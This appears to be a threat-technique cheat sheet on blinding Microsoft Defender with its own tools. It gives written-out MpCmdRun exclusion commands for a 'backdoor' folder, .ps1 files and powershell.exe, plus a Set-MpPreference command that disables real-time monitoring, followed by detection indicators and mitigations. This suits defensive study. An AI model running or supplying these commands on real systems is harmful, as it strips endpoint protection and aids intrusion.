# 🛡️ Defender Evasion via LoL Techniques

**Defender Evasion** uses native Microsoft tools — including Defender itself — to disable or blind AV protection from within the system. These tactics abuse trusted binaries to **bypass**, **disable**, or **exclude** malicious activity from being scanned.

> ⚠️ Used by ransomware, cobalt loaders, and post-exploitation kits. These tactics are dangerous and often ignored by default AV settings.

---

## 🛠️ What It Does
- Adds exclusions via Microsoft-signed tools
- Disables real-time protection without alerts in weak configurations
- Uses LoLBins (like `MpCmdRun.exe`) to evade logging

---

## 💣 Evasion Tactics

### 1. Add Exclusion via Defender CLI
```cmd
MpCmdRun.exe -AddExclusionPath "C:\Users\Public\backdoor"
```
✅ Tells Defender to ignore everything in the backdoor folder

### 2. Add Extension Exclusion
```cmd
MpCmdRun.exe -AddExclusionExtension ".ps1"
```
✅ Defender won’t scan PowerShell scripts anymore — major risk

### 3. Add Process Exclusion
```cmd
MpCmdRun.exe -AddExclusionProcess "powershell.exe"
```
✅ Disables Defender scanning for *all* PowerShell executions

---

### 4. Disable Real-Time Monitoring (PowerShell)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
✅ This setting is sometimes allowed under weak group policies

### 5. Tamper Protection Limitations
If **Tamper Protection** is off (common in test VMs):
- These changes persist silently
- Can be scripted in initial access payloads

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| MpCmdRun usage with exclusion switches | Monitor CLI logs and defender logs (Event ID 5007) |
| Sudden exclusion of entire folders or extensions | Alert on `.ps1`, `.dll`, `.exe` exclusions if not policy-defined |
| Use of PowerShell `Set-MpPreference` | Flag all changes to Defender configuration via script

---

## 🔐 Mitigation Strategies
- **Enforce Tamper Protection** on all endpoints
- Use GPO to prevent local Defender config changes
- Monitor Defender logs (`%ProgramData%\Microsoft\Windows Defender\Support\MPLog*`)
- Flag suspicious use of Defender CLI from user context

---

> 🧠 The best way to hide from Defender... is to *ask Defender nicely*. If your defenses trust the attacker’s requests — they’ll look the other way. That’s the LoL way.
